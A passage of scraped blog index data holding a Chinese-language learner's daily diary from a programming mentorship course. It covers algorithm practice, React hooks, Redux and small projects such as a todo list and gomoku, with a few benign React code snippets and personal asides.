學到的事情學著讓自己用「一個指令做一件事」的方式來思考怎麼解題，還有「把事情由大拆到小」的方式來思考，這兩種方式是我覺得對解題會比較有幫助的思考模式。 瞭解到自己有時候也會犯一些新手常犯的錯誤，例如說「解題的時候邊寫邊想怎麼解」或是「嘗試套用過去學過的語法」。希望可以在這一次的複習中改善這個問題。 雖然我覺得虛擬碼有點彆扭，總會不自覺的就寫成程式碼，失去了虛擬碼的通用性。 沒有什麼訣竅，就是一行一行多練習。 這也許正是我該做的事吧，不過也希望自己要拿捏好時間，否則本末倒置就不好了。 題外話沒錯，今天是冬至，但也是最不冷的一天；不過湯圓還是那個熟悉的老味道（也才前幾天才剛吃過）。 轉眼間就要到年底了，希望自己的規劃能夠一切順利。 期許明天的進度是把 [ALG101] 的進度給做完（包含實作），還有 [CS101] 一些演算法的部分想做點練習跟筆記，最後能順便做一下挑戰題的話就更好了。","link":"/2021/12/22/mentor-program-day11/"},{"title":"mentor-program-day110","text":"進入最後一關。 進度今天把 week17 正式結束了，接下來就開始去看 React 的課程了。 雖然本來是想把 week18 給做完的，不過後來想想還是先學 React 好了，希望沒有做出不對的選擇。 總之希望一切順利吧！附個今天做的筆記： 在 Seuqelize 中使用環境變數的方式 關於 Express 中的 session-secret 學到的事情今天是正式接觸 React 的第一天。 以寫過 Vue 的經驗來說，我覺得 React 的學習門檻比較高。意思是說你 JS 不好的話你可能會寫的很懷疑人生。 不過從中也能發現一些有趣的事情，React 為了讓什麼事情都變成 JS 的形狀，設計出了各種有趣的東西。像是 CSS 的寫法，HTML 的寫法等等，都跟 Vue 完全不同。 總而言之，目前覺得這是個蠻有趣的框架。希望之後能跟它打好關係。 題外話還是很想念寶貝們，希望它們都是快樂的天使。 期許祝我自己 React 學習順利！","link":"/2022/04/04/mentor-program-day110/"},{"title":"mentor-program-day111","text":"風平浪靜。 進度今天是 React 的第二天，體驗了人生第一次的 CSS-In-JS，還有第一個 hook（useState），隨手寫了一個陽春的 Todo list： 雖然才剛剛開始，不過覺得還蠻有趣的，自己還蠻喜歡 React 的思考方式的，希望接下來的過程也能像現在一樣一帆風順。 學到的事情今天先把重點放在 CSS 的部分，大致把 style-component 的文件說明讀過了。感想是還蠻喜歡用這種方式來寫 CSS 的。 另外也學了第一個最常用到的 hook：useState，光用這個東西就可以寫簡單的 Todo list 了。 以前我一直覺得框架用起來沒有很順手，因為框架的思考模式跟 Vanilla JS 有很大的不同，再加上原生 JS 不熟的話就會更難理解框架到底解決了什麼問題？為什麼要用框架？諸如此類的問題。 總而言之，現在了解框架存在的意義是什麼，也知道為什麼要用框架，希望接下來可以把它熟能生巧。 題外話最近找到了一個不錯的公園，在那裡散步特別舒服。 期許希望明天的 React 一樣順利。","link":"/2022/04/05/mentor-program-day111/"},{"title":"mentor-program-day113","text":"還不夠多。 進度今天把 React 基礎的部分看完了，做了一些筆記： React 父子元件間的溝通 React 關於 state 的一些概念 React 關於 render React 的第一個 hook：useState React 的第二個 hook：useRef React 的第三個 hook：useEffect React 的第四個 hook：useLayoutEffect 雖然說是基礎，不過卻是很重要的概念。希望在接下來的實作練習後能對它們更熟悉一點。 學到的事情hook 確實是很方便的東西，不過難的地方在於要能知道在什麼時間點用哪一個 hook 比較正確。這也考驗了一個人對 hook 的理解程度，如果你不夠理解背後的一些流程跟渲染機制，大概會用的亂七八糟的吧。 總而言之，既然已經弄懂一些概念了，剩下的就是靠練習來慢慢跟 React 打交道了。 用就對了，久了就會慢慢抓到那個 pattern 了 希望這句話是真的，加油吧！ 題外話有時候會很怕自己現在做了不對的選擇。 自從寶貝走了以後，就會開始思考一些事情，會不會某一天突然被告知女朋友只剩下多久壽命？而我是不是會後悔沒有在有限的時間去做我真正在意的事情？ 對我而言，和女朋友一起度過每一天才是真正幸福的事情，是願意放棄一切來換取的事物。 感覺又語無倫次了。但是呢，自己是打從內心的希望，那一天永遠永遠不要到來。 期許接下來的日子應該都是 React 了，總而言之希望一切順利吧。","link":"/2022/04/07/mentor-program-day113/"},{"title":"mentor-program-day114","text":"即將結束的基礎，不過也開啟另一個進階的開始。 進度今天開始研究了一些和效能相關的 hooks，也對 React 的運作機制更清楚一些： 什麼是 Virtual DOM？ React 的第五個 hook：memo React 的第六個 hook：useCallback React 的第七個 hook：useMemo 現在滿腦子都是「re-render嗎？ 還是不 re-render？」 學到的事情Virtual DOM 是個學起來蠻硬的概念，從以前學 Vue 的時候就有稍微聽過這東西，但只知道它是個虛擬的 DOM 物件這樣而已，沒有鑽研太多。這一次在看過幾篇實作的文章後，有比較理解底層大概是怎麼運作的（應該吧，雖然沒有跟著實作，太懶了）。 至於其他的新 hook，感覺 memo 和 useCallback 是比較容易踩雷的東西，可能就多踩幾次就會慢慢熟了吧～ 題外話第一次吃鮪魚肉燥飯，意外地很好吃。 期許希望明天可以把 React 基礎的課程給告個段落，接下來就要進入實戰了。","link":"/2022/04/08/mentor-program-day114/"},{"title":"mentor-program-day112","text":"一步一步向前進。 進度今天繼續學 React 基礎，也做了一些筆記： 三種在 React 中寫 CSS 的方式 Styled-components 基礎 JSX 的原理 React 之 Component 基礎 雖然 React 學起來蠻有趣的，不過還是需要一些時間來消化 React 的思維，總之就一步一步來吧！ 學到的事情今天再次複習了有關 useState 的用法，跟一些 styled-component 的方法，像是可以把 CSS 寫成一個共用的 function 之類的。 另外也從 PJ 大大寫的 [Day 08 - 計數器] 一個不夠，給我一次來十個 - JSX 中迴圈的使用 中學到「利用 function 來回傳另一個 function」的方式來寫 code，覺得是很機智的作法。 總覺得寫程式語言有趣的地方就是這點，總會有人想出很奇妙的作法。 接著也摸了一點其他的 hooks，如 useEffect 和 useRef 這兩個。還沒有完全弄懂，所以明天要來繼續加油了！ 題外話今天在夜晚中跟女友一起散步聊心，感覺很平凡，卻也很享受這樣的時光。 期許希望明天能在多一點進度就好了。","link":"/2022/04/06/mentor-program-day112/"},{"title":"mentor-program-day115","text":"繼續努力吧。 進度今天一樣是 React 的內容，先附上筆記： React 寫一個自己的 hook！ 初探 Class-component React class component 的生命週期 React 的第八個 hook：useContext 與 createContext 感覺自己的知識量越來越豐富了，希望接下來的實戰能好好發揮。 學到的事情今天花了比較多時間研究 Class component，還記得在剛入門 React 時，有聽過不少前輩都說要從 class 跳到 hook 會很不習慣，因為會被「生命週期」的觀念給綁住，所以在接觸 class 之前還蠻好奇到底是差在哪的，今天算是解惑了吧。 自己寫起來的感想是，感覺就跟 Vue 的生命週期很像，在 Vue 裡面也會給妳各種生命週期的 method（或是被 Vue 稱作 hook），你想在什麼時候做什麼事情就寫在對應的 method 裡，而 React 的 class 也是差不多的概念。 React 的 hook 確實是一個蠻不同的思維，寫起來也相對直覺很多，怪不得 hook 推出以後就幾乎取代 class 了，因為真的乾淨也順手很多。 題外話女友的媽媽煮的咖哩飯特別好吃，每次吃到就會特別開心。 期許希望明天一樣順利，加油。","link":"/2022/04/09/mentor-program-day115/"},{"title":"mentor-program-day116","text":"實際上陣的一天。 進度今天正式進入 React 的實戰內容，還是老樣子的留言板，這個版本應該能叫做「React + SPA 留言板」？總之先附個紀錄： 實際上陣的感覺真的是迷迷糊糊，剛開始寫的時候完全不知道能用一個 state 來存留言內容。 可能是還沒抓到寫 React 的 Pattern 吧，不過多練習幾次應該就會習慣了。 學到的事情今天除了做留言板以外，也久違的切了個版，不過這次對有一件事特別有感觸，就是： 有 U 質的設計稿真好。 還記得我在做 餐廳網站 的時候，那個後台畫面真的是我想了半天才弄出來，到最後還是覺得有夠醜，哈哈哈哈。 所以這次做留言板就直接去 Frontend Mentor 找設計稿，真的是切起來順暢多了，畫面也好看很多。 總而言之，為什麼工程師都很害怕設計？因為 100 個工程師裡面有 87 個都沒什麼設計感跟美感，而我也是那其中一個。 題外話希望疫情別又爆炸啦 rrrrr。 期許希望明天可以把實戰的部分做完，然後繼續把課程給看完。","link":"/2022/04/10/mentor-program-day116/"},{"title":"mentor-program-day117","text":"繼續堅持吧。 進度今天把昨天寫好的 React 部落格做最後的微調，並部署到 GitHub 上： 關於部署 React 做得很完整，不像寫 Vue 的時候還得寫一個 shell script，React 直接開一個 CLI 讓你一鍵部署，果然工具可以讓人省掉很多時間。 不過這也會產生另外一個問題，就是有時候簡化太多東西時反而會不知道背後做了什麼。只能說要懂得自己做取捨吧，最好在用任何工具前先理解它幫你做了什麼，而不是傻傻的只知道可以這樣用。 接著也開始做下一個實戰練習「部落格」，開始學習跟 Router 有關的東西了。 雖然一開始就被新舊版本的問題給卡了好久，真的蠻討厭舊版新版的這種問題，因為當資訊不完整的時候真的很難 debug，希望之後在處理這方面能的問題時能更熟練一些。 學到的事情淺談新手在學習 SPA 時的常見問題：以 Router 為例 是好的一篇文章，看完後把幾個以前沒有很懂的東西搞懂了： 為什麼 SPA 重新整理會 404？ 動態跟靜態網站差在哪？ 以前只有大概知道是路徑的關係，但那時候還沒什麼網路基礎知識，所以完全看不懂網路上說如果是用 History API 來做路由的話後端得跟著做調整，到底是什麼意思。 還有動態跟靜態網站的關鍵點是差在哪？以前我也說不出來。但現在可以大聲的說： Server 有沒有幫你把檔案「做處理」 聽完這個論點後真的打通任督二脈，確實這就是最大的差別。 後來還有學到一些 React Router 的東西，大致上就是用 JavaScript 來變更網址的狀態吧，這邊就不細談了，等我更懂後再說。 題外話雖然吃不到真的燒肉，但能吃到好吃的烤雞井飯也蠻開心的。 期許希望明天可以順利把 React 部落格的實戰做好。","link":"/2022/04/11/mentor-program-day117/"},{"title":"mentor-program-day118","text":"希望能一步一步做好。 進度今天繼續做部落格的實戰，目前把幾個功能給做好了： 串 API 顯示所有文章 串接登入、註冊功能 顯示單篇文章功能 用 React 做 UI 處理確實比 Vanilla JS 輕鬆許多，不過還在慢慢習慣這種 state 的思考模式，總之多加油吧。 學到的事情感覺主要就是練習怎麼使用 hook 吧！因為儘管知道 hook 的作用，但也不代表你知道要在什麼時候把他們拿出來用。所以我覺得這才是學 React 最重要的部分，也是我想練好的部分。 另外昨天本來想用 useContext 來處理 Loading 的 state，大概像這樣： 1234567891011121314151617181920212223const [isLoading, setIsloading] = useState(false);return ( &lt;ThemeProvider theme={theme}&gt; &lt;GlobalStyle /&gt; {/* loading Context */} &lt;LoadingContext.Provider value={[isLoading, setIsloading]}&gt; &lt;AuthContext.Provider value={{ user, setUser }}&gt; &lt;Router&gt; &lt;NavBar /&gt; &lt;Routes&gt; &lt;Route path=\"/\" element={&lt;HomePage /&gt;} /&gt; &lt;Route path=\"/about\" element={&lt;AboutPage /&gt;} /&gt; &lt;Route path=\"/categories\" element={&lt;CategoriesPage /&gt;} /&gt; &lt;Route path=\"/posts\" element={&lt;PostsPage /&gt;} /&gt; &lt;Route path=\"/posts/:id\" element={&lt;SinglePostPage /&gt;} /&gt; &lt;Route path=\"/log-in\" element={&lt;LoginPage /&gt;} /&gt; &lt;Route path=\"/sign-up\" element={&lt;SignUpPage /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; &lt;/AuthContext.Provider&gt; &lt;/LoadingContext.Provider&gt; &lt;/ThemeProvider&gt;) 但不知道是不是跟 re-render 的問題有關，我這樣子做以後沒有辦法在底下的子元件用 setIsloading(false) 把 loading 關掉 QQ。 可能要多練習看看才能找出問題了。 題外話雖然對作品已經有一些想法了，不過不知道自己做不做得出來，希望可以吧～ 期許明天也要繼續努力練習 React。","link":"/2022/04/12/mentor-program-day118/"},{"title":"mentor-program-day119","text":"繼續往下個里程碑前進。 進度今天把部落格做最後的優化，也加上了新增文章的功能，應該差不多得先告一個段落了吧！ 我也開了一個 Repository，打算之後再回來把想做的功能加上去。 另外也做了一些筆記： 使用 useContext 要注意的細節 React 基本的路由結構 使用 useState 要注意初始值的設定 一些在手機上 CSS 的小細節 關於昨天碰到的問題也解決了，很好！ 學到的事情今天在解決 useContext 的問題以後，感覺有對 React 的渲染機制更理解一點。在不熟悉的情況下，很常會把一些跟 state 有關的操作寫在 Component 裡，經過這次後也理解到 useEffec 的重要之處。 另外寫 React 的這幾天也學到模組化開發的好處，現在已經蠻習慣這種「拆成一個一個」的寫法了。不過這也多虧了 React 是很基於 JavaScript 的框架，跟 Vue 的理念不太一樣。它有自己的另一套機制，所以以前在寫的時候比較難體會到「模組化」的感覺（純粹我個人想法）。 總之，雖然可能很有很多地方得學，但寫到現在還是蠻喜歡 React 這套框架的，寫得很開心！ 題外話希望有朝一日我也能拿出一套很棒的作品。 期許繼續 React，也許可以開始寫作業了吧。","link":"/2022/04/13/mentor-program-day119/"},{"title":"mentor-program-day12","text":"腦動的特別多，時間過得特別快。 進度今天 [ALG101] 看到 Unit3 結束，沒有達到預期的進度，但做題目的時候學到了蠻多知識跟小技巧，也做了一些紀錄： 幾個水桶？ 快速轉成二進位的方法 貪婪的小偷 學到的事情儘管以前有看過講解影片，但其實也忘的差不多了，所以今天在做題目時很開心能夠自己想出解法， 現在的自己比以前更加專心在練習跟分析解題過程，真的卡關時也會試著去尋找相關的答案，然後試著理解背後的概念。 也有一件蠻特別的事情，原本我是打算在 Lidemy 討論區 找一些有用的資訊，結果剛好看到某個人寫的 code，就順道研究了一下別人的解題思維。 其實那個人的整體的解題思維不能說是最完美的，但是從他身上我學到了運用內建函式的技巧，我認為這是蠻值得的一件事情。 也許在每個人的身上都能找到值得學習的地方，所以我還蠻喜歡看別人討論問題或者寫完題目後去看別人的解法，在這個過程中我總能得到一些新的想法，或是意外發現一些原本自己不知道的事情。 題外話是說今天收到了應徵的感謝函。也許是因為第一次收到，感覺還挺微妙的？原來還真的有公司會寄感謝函 XD 聖誕節是個浪漫的節日，希望今年可以跟女朋友一起快樂地度過平安夜。 期許也許這週的進度比較趕，總是沒能達成預期目標。 希望明天真的可以把 week2 的進度給結束，看了一下內容感覺是有機會的？ 加油加油！","link":"/2021/12/23/mentor-program-day12/"},{"title":"mentor-program-day120","text":"原來四個月過去了。 進度今天開始把第一個 todo list 作業做完整，把該做的功能都補上了： 從以前就覺得編輯的功能最難做，這次也差不多。雖然做是做出來了，但還是有些地方還不太懂，可能得在多練習或找資料來看看吧。 題外話，我們現在從 Store 上下載的 todo app 其實真的藏了很多細節在裡面，像是： 在編輯某個 todo 時，如果又去點其他的編輯，要記得把上一個編輯中的狀態給 clear（這個很多同學沒注意到） 編輯 todo 時，如果內容是空的應該要擋下來 &lt;input&gt; 這東西如果字太小（&lt;16px），在 focus 的時候會自動 zooming，使用體驗不好 在編輯時，應該要把原本的「已完成」，「刪除』按鈕給隱藏起來比較合理。 還有其他太多細節能做了，特別是跟「編輯」有關的功能，所以我才會說編輯是最難做的一塊。 學到的事情來把一些我覺得還蠻重要的東西給紀錄一下： 透過條件渲染的 Component 時，useRef 沒辦法抓到正確的值 onBlur 是一個很好用的事件（可以處理離開編輯的狀態） derived state 跟 state 的差別（這個絕對重要） 總之在多練習吧，感覺目前寫的 code 還有很多地方能做優化。 題外話不知道小傢伙們現在過的怎麼樣，希望他們是快快樂樂的。 期許明天要把 code 做優化，然後開始研究五子棋該怎麼做了。","link":"/2022/04/14/mentor-program-day120/"},{"title":"mentor-program-day121","text":"運轉吧，大腦。 進度今天把 todo list 做最後的 UI 調整，到這邊告一段落： 接下來，為了做出五子棋，首先得去先研究 React 官方教學 的圈圈叉叉。 不管是寫什麼應用程式，真的都是魔鬼藏在細節裡。原來一個簡單的圈圈叉叉也能藏這麼多細節在裡面。 目前還在研究整體思路，希望明天能把它弄清楚。 學到的事情在讀官方文件的範例時，深深體會到 Closure 的重要性，拿下面這段 code 來舉例： 12345678renderSquare(i) { return ( &lt;Square value={this.state.squares[i]} onClick={() =&gt; this.handleClick(i)} /&gt; );} 如果不懂 Closure，絕對不能理解為什麼 &lt;Square /&gt; 裡可以拿到 i 的值： 12345678910111213class Square extends React.Component { render() { return ( &lt;button className=\"square\" // 其實就等於 () =&gt; this.handleClick(i) onClick={() =&gt; this.props.onClick()} &gt; {this.props.value} &lt;/button&gt; ); }} 因為 Closure 的關係，每個 &lt;Square /&gt; 在綁定 onClick 時就已經被指定 i 的值了，所以其實能看成這樣子： 1234&lt;button onClick={() =&gt; this.props.onClick(0)}&gt;&lt;/button&gt;&lt;button onClick={() =&gt; this.props.onClick(1)}&gt;&lt;/button&gt;&lt;button onClick={() =&gt; this.props.onClick(2)}&gt;&lt;/button&gt;... 只能說這就是 React 有趣但也困難的地方，理解的話就會覺得「哇，原來還有這招」，不理解的話就會覺得「What the… 這啥」。 題外話窯烤的馬鈴薯有一個窯烤的香味（廢話？ 期許希望明天把圈圈叉叉的「時光旅行」搞懂。","link":"/2022/04/15/mentor-program-day121/"},{"title":"mentor-program-day122","text":"不認輸，繼續奮鬥。 進度今天跟圈圈叉叉奮鬥了一整天，差不多快釐清整個思路了，還差一點就完成了。先附上第一篇筆記 想用 React 做出五子棋嗎？先從圈圈叉叉開始吧，相信明天就能搞定，加油！ 學到的事情在讀官方文件時，發現背後還藏了蠻多那些進階 JavaScript 的知識，最常見的就是 this 跟 closure。 舉例來說，官方在處理 this 值是這樣做的： 12345678910111213141516171819202122232425class Board extends React.Component { constructor(props) { super(props); this.state = { squares: Array(9).fill(null), }; } handleClick(i) { const squares = this.state.squares.slice(); squares[i] = 'X'; this.setState({squares: squares}); } renderSquare(i) { return ( &lt;Square value={this.state.squares[i]} // 用 arrow function 來綁定 onClick={() =&gt; this.handleClick(i)} /&gt; ); } // ...} 箭頭函式雖然寫起來乾淨，但缺點是可讀性不是那麼好，所以我原本看不太懂官方特別強調這邊用箭頭函式的原因是什麼。不過後來去 codepen 轉換一下寫法就懂了： 1234567891011121314renderSquare () { return ( &lt;Square value={this.state.squares[i]} // 外面包一層 function onClick={function wrapper () { // 1. onClick 時 呼叫 wrapper // 2. 執行 wrapper 時又再呼叫 this.handleClick(i) // 3. 至於 i 的值會是透過 scope chain 找到當初執行 renderSquare 的 i this.handleClick(i) }} /&gt; )} 理解完這些以後，我才明白當你對一個東西不了解時，你可以試著像這樣抽絲剝繭，把那些簡化後的東西打一步一步打回原形。通常這樣做以後就會慢慢找出答案了。 題外話聽說南韓已經開始放寬防疫制度了，台灣也似乎也打算這樣做。 不知道未來會怎麼樣，總之還是希望大家能平安無事就好。 期許明天要把圈圈叉叉搞定，然後開始搞五子棋。","link":"/2022/04/16/mentor-program-day122/"},{"title":"mentor-program-day123","text":"燒腦的一天。 進度今天終於開始做前人提到的大魔王：五子棋。 目前只做出了基本的版面跟下棋功能： 但是判斷輸贏的方法想了一晚還是沒想出來rrrr 只好留到明天繼續戰鬥！加油！ 學到的事情今天剛開始做五子棋時，本來想用圈圈叉叉的資料結構來做： 12345const data = [ \"O\", null, \"X\", \"O\", null, null, \"X\", null, null] 這樣子做以後畫面確實可以運作，但是就卡在判斷輸贏的邏輯不知道該怎麼寫才好。上網查資料找到的全部都是用「二維陣列」的結構來解的。於是只好砍掉重練，乖乖用二維陣列來重做（雖然我真的很不想碰二維的陣列或物件QQ）。 剛開始真的還蠻燒腦的，太久沒碰這種比較複雜的資料結構了，再加上又得用雙層迴圈來處理。好在後來靜下來一會兒後有慢慢釐清思緒，一步一步把基本的東西先寫出來了。 後來也意外地踩到「淺拷貝」的地雷，所以寫了這篇筆記：該來談談淺拷貝（Shallow copy）與深拷貝（Deep copy）了 原本我還想說 JSON.parse(JSON.stringify(data)) 是什麼脫褲子放屁的行為，後來才知道原來這就是 deep copy 阿，真的是太蠢了～ 總之，雖然是很燒腦的一天，但也學到了蠻多東西。 題外話喜歡聽唱歌好聽的人唱歌。我覺得唱歌好難呀。 期許希望明天能把輸贏的邏輯寫出來！衝了！","link":"/2022/04/17/mentor-program-day123/"},{"title":"mentor-program-day124","text":"繼續走下去。 進度今天終於是把五子棋完成了，先附上成果圖： 不過有點小傷心，是關於判斷輸贏的部分。原本已經把橫排與直排的判斷給寫出來了，但就差在斜排的部分不知道該怎麼寫才好。 過程中一樣爬了蠻多篇文章，但感覺都不太能理解，看到各種三層迴圈，總覺得有點太過複雜化的感覺。於是最後參考了 Huli 寫的 範例。 這個過程就是一行一行 code 邊照著打邊思考，最後才理解原來只要「以下棋點為中心」來思考，在利用 do...while 其實就可以判斷應付所有 case 了。 學到的事情也許是自己還是不夠厲害，只是個小遊戲而已卻也寫不太好，不過還是要繼續更加油下去吧。 從五子棋這個作業裡面除了學到 React 的思維，也碰到了一些以前學到的 JavaScript 進階概念，最深刻的大概就是「淺/深拷貝」和「閉包」了吧。 當然，還有那個顧人怨的 this 值（如果是寫 class component）。 總而言之，希望自己接下來要更努力把東西學好。 題外話我以前總認為「很會寫程式」的定義是能用短短幾行 code 來解決問題。 但經過這幾年的時間，我現在認為真正厲害的人是能夠讓別人一下就理解它在寫什麼，這個才是比較厲害的地方。 期許希望明天能把 week21 結束。","link":"/2022/04/18/mentor-program-day124/"},{"title":"mentor-program-day125","text":"得在更努力一點才行。 進度今天把 week21 的作業都完成了。 感覺這一週還蠻艱辛的，接下來應該會更艱辛吧，得好好加油才行。 學到的事情感覺最近進度不怎麼好，偶爾會提不起勁。不過還是想盡力讓每一天都能有產出，儘管如此，還是會覺得自己不夠好，很不應該。 好像拉得有點遠，還是來稍微說一下今天大概學了什麼好了。 今天在做表單驗證時，本來的想法是幫每個 &lt;input&gt; 建立一個自己的 state，不過後來想想，乾脆用一個物件來表示所有元件似乎會更簡潔一些，像這樣： 12345678const [formData, setFormData] = useState({ nickname: \"\", email: \"\", tel: \"\", type: \"\", learnFromWhere: \"\", suggestion: \"\",}) 接著只要有一個 &lt;input&gt; 改變時就更新這個 state 就好，省事很多。 而且這樣的好處是如果要送 request 的話就不用再另外整理成 Object，只要拿現成的就好。 題外話有時候會感到累，但現在是最該努力的時候。 期許明天也許會做點筆記，也應該會開始進到下一週的進度。","link":"/2022/04/19/mentor-program-day125/"},{"title":"mentor-program-day127","text":"加油。 進度今天花了些時間看官方文件，總算是看完了，也做了簡短的筆記：React 重新複習 hooks 接下來剩下 class component 的部分，趕緊加快腳步看一看，希望快點進入 redux 的部分。 學到的事情今天重新複習了各種 hook，有把一些以前不太是很熟的觀念給弄更懂一些，順便學到了一兩個原本不知道的 hook。 大概就這樣吧！其他詳細都寫在筆記裡了，這邊就不贅述。 題外話一定要成功，加油。 期許希望明天把剩下的作業搞定。","link":"/2022/04/21/mentor-program-day127/"},{"title":"mentor-program-day126","text":"快完成了吧。 進度今天開始跑 week22 的進度，部落格的作業在看課程時就做得差不多了，所以今天只是再加上分頁的功能，跟一些 UI 的調整： 接著開始去看 官方文件，把一些關於 hook 的概念補得更清楚一些，希望明天看完後能把簡答題搞定。 學到的事情今天做的事情跟以前差不多，但要改用 React 的方式來思考這樣子，什麼東西該是 state？這個問題有時候可以牽扯到蠻多細節的。 但我覺得比較難的地方是優化的部分吧，要怎麼活用 useCallback 和 memo 等等相關的 hook 還蠻需要了解 React 的渲染機制的，不懂的話就會不知道什麼時候該加，什麼時候不該，或甚至亂加加到程式直接壞掉也有可能。 總之，希望接下來能把 React 練的更精深一些。 題外話我成長了很多嗎？不知道現在的自己在別人的眼中是什麼模樣。 期許希望明天把 hook 弄熟，接著能進到 redux 的環節就更好了。","link":"/2022/04/20/mentor-program-day126/"},{"title":"mentor-program-day128","text":"最後一塊拼圖。 進度今天再次複習了 class component 的生命週期，也寫了筆記：React 重新複習 class component 的生命週期 總算是完成了 week22，接著開始正式學習 Redux 的使用。 學到的事情雖然有些觀念感覺要實際碰到才能吸收更多，但相信先理解個概念也是有幫助的吧。 今天重新練習了 class 的生命週期，感覺有更理解一些，不過也體會到為什麼 hook 推出後就很少人在寫 class component 了，因為真的簡潔也直覺很多。 目前學的基本 redux 感覺還不算太難，但不知道是不是有埋藏什麼大魔王在裡面，看前人在這個時期都哀鴻遍野，希望自己不會走得太艱辛。 題外話這是最後一塊拼圖了，希望一切順利。 期許希望明天 redux 順利。","link":"/2022/04/22/mentor-program-day128/"},{"title":"mentor-program-day129","text":"每個人都有自己擅長的領域，希望我是屬於會寫 JS 的那個。 進度今天繼續看 Redux 的影片，目前學的都還算順利，之後會在把整理後的筆記放上來。 也順便看了一下額外的影片，學到了新的 VS code 的技巧。 學到的事情今天有跟著影片做練習，感覺對 Redux 有越來越熟悉一點。 雖然確實就跟 Huli 說的一樣，當專案小的時候 Redux 反而是一種麻煩，不過當專案大以後 Redux 帶來的效益應該還蠻大的，怪不得出外找工作幾乎都希望你會 Redux 這種東西。 差不多就這樣吧！其他的都寫在筆記裡了。 題外話 很多工程師都只會重建，而不會重構。 這句話是來自 兩年過後，我能夠被稱為資深工程師了嗎？ 裡面提到的，覺得自己不應該也成為這種人，所以得多加油才行。 期許希望明天 Redux 順利，如果能盡快把課程看完的話就更好了。","link":"/2022/04/23/mentor-program-day129/"},{"title":"mentor-program-day13","text":"疲倦的一天。 進度今天把 [ALG101] 看到 week2 的進度了（除了一兩題題目還沒做）。緊接著開始進入 week3 的進度，看了一點 [JS102] 的內容，目前看到 36%。 一樣紀錄一下筆記的部分： 印出星星（金字塔） 求出 1-100 的平方數 模組化的輸出與輸入 引用模組的注意事項 npm 小知識 今天的進度應該還行吧，不過也比較疲倦一些。 學到的事情在練習 LIOJ 上的題目時體會到一件事情，跟數學有關的題目做起來特別卡，像 印出星星（金字塔） 跟 求出 1-100 的平方數 就是個蠻好的例子。 也許這兩題看起來豪不起眼，但讓我感到困難的地方在於「我的腦知道該怎麼做，但卻不知道怎麼轉換成程式碼」。就好像你知道有個規律是： f(1) = 1 f(2) = 3 f(3) = 5 但你對這中間的運算過程毫無頭緒，找不出規律性。 又或者是你知道一個數字在開根號後不是整數就代表這個數字不是「平方數」（例如 3 開根號不是整數，所以 3 就不是平方數），但你依然毫無頭緒，因為在 JavaScript 裡並沒有一個「判斷數字是整數還是浮點數」的運算子。 當然，這些題目並不一定要用這兩種方式才能解出來。我想說的是有些題目你可能第一個會想到的方法就是用數學來處理，可是你同時也發現自己不知道該怎麼實際運用，這會讓人特別的有感觸。 也許總有一天我該回去加強我的數學，但現在得先努力把計畫給跑完才行。 除了做題目之外，今天也學了一點模組化的應用，也有一點更深的認識。雖然有一件事情讓我耿耿於懷，就是我看不太懂 webpack 新手教學之淺談模組化與 snowpack 文章中實作 require 跟 module 的部分。希望之後我能再回來弄得更清楚，也試著自己實作看看。 另外特別的事情是今天是第一次用 yarn 這個 package manager。其實以前就經常聽到這個名字，不過在 npm 其實就很夠用的前提之下，一直沒有機會去碰到，今天算是被課程給牽起紅線吧（我不知道我在形容什麼）。 總而言之，今天是個蠻有趣但也相對疲倦的一天，也許是課程的進度慢慢加重了，得好好加油才行。 題外話後天就是聖誕節了，雖然還沒有計畫那一天要做什麼，但還是會有點期待。 聖誕節是我女朋友很喜歡的一個節日。其實我本來是個不怎麼過節的人，但在認識了女朋友後，也逐漸喜歡上聖誕節的氣息；也喜歡上了「薑餅」這個反應很兩極的餅乾。 期許希望明天可以把 [JS102] 看完，跟把 [ALG101] 的進度給跟上，大概就是這樣吧！","link":"/2021/12/24/mentor-program-day13/"},{"title":"mentor-program-day130","text":"Redux 的一天。 進度今天再次練習 Redux 的使用，影片的部分看到了 Redux toolkit 的部分，但感覺對 toolkit 的做法有點似懂非懂的，所以又重新跑了一遍 Redux 的基本流程，也寫了一篇筆記：初探 Redux 明天打算在重新跑一次 React Redux 的流程，寫一篇完整的筆記來記錄，順便讀一下官方文件。 學到的事情不管是學 Redux 還是其他的工具，都會體驗到其實背後最強大的東西還是 JS，或者說是程式語言。 很多東西在還沒優化之前，都會有繁瑣的 code 或是前置作業得處理。所以總會有人想到「阿，既然 JS 可以…，倒不如就讓 JS 來處理吧！」等等之類的。或者說，其實也不見得是 JS，而是寫程式語言本來就有一些 pattern，你會知道用「純字串」來當作 parameter 肯定會踩到一些地雷，所以更好的做法是用變數來取代。 總而言之，當你程式寫得越久，就會在無形中產生一點 sense，也不太知道該怎麼形容這種感覺。 題外話女朋友的生日要到了，希望生日這天她會是世界上最快樂的人。 期許明天希望把 Redux toolkit 搞懂～","link":"/2022/04/24/mentor-program-day130/"},{"title":"mentor-program-day131","text":"繼續向前走。 進度這幾天把筆記給整理一下，Redux 的部分算是都做完了吧： 用 react-redux 把 redux 跟 React 串接起來（Hooks 版本） 用 react-redux 把 redux 跟 React 串接起來（Connect 版本） 用 Redux-toolkit 串接 React 和 Redux Redux middleware 剩下的就是邊實戰邊練習了，希望能夠做好，加油。 學到的事情覺得 Redux 的概念本身不算複雜，本質就是 dispatch、store 和 action 這幾個東西在運作，只是當要管理的 state 越來越多時就會逐漸複雜，所以大家才會說 Redux 難學吧，何況後來還延伸出 Redux saga 或 observable 這些東西，把整體的難度又在往上提升了一個 level。 總而言之，希望能慢慢熟悉，畢竟這些應該是身為前端必須知道的知識。 題外話課程即將結束，不知道未來求職是否也能像現在一樣順利，希望這幾個月的努力沒有白費。 期許明天應該就能把課程看完了，希望最後的幾個作業做的順利。","link":"/2022/04/26/mentor-program-day131/"},{"title":"mentor-program-day132","text":"也許是時候畫下句點了。 最後想說的一些話雖然現在的我還沒有把所有課程的作業都給做完，但 程式導師實驗計畫 想帶給學生的內容，我想我已經差不多都接收到了。 接下來的日子，不會再有人帶著我，告訴我下一步該往哪裡走，全部都得靠我自己了。 從踏入這一行開始我就明白一件事情，就是學習是永無止盡的。也許我完成了這份計畫，也成長了不少。但這並不是學習的終點，而是邁向未來的另一個起點。 總之，目前只是想說，這份課程的紀錄差不多就到此為止了，我很慶幸在這 132 天內學到了這麼多超乎我預期的知識。接下來的學習會是另一個全新開始，希望我真的已經學會自主學習的這份能力，這才是最重要的一件事情。 附註：之後等我完成所有作業後，會在回來把這篇結尾心得打的更完整一些吧，但目前就先這樣子！","link":"/2022/04/27/mentor-program-day132/"},{"title":"mentor-program-day14","text":"Merry christmas. 進度今天把 [JS102] 看到了 